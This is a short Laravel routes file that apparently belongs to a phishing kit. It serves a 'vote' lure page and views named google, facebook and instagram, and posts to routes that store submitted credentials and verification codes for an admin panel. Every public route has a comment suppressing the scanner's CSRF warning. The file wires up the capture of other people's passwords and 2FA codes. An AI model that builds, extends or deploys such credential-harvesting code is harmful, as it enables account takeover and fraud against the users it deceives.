<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\LoginAttemptController;

// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::get('/', function () {
    return view('vote');
});



// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::get('/google', function () {
    return view('google.index');
});

// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::view('/facebook', 'facebook');
// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::view('/instagram', 'instagram');



// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::post('/store-credentials', [LoginAttemptController::class, 'storeCredentials']);
// amazon-q-ignore[php-csrf-missing-protection-ide]
Route::post('/store-verification', [LoginAttemptController::class, 'storeVerificationCode']);

// Admin Routes
Route::prefix('saheed/admin')->group(base_path('routes/admin.php'));
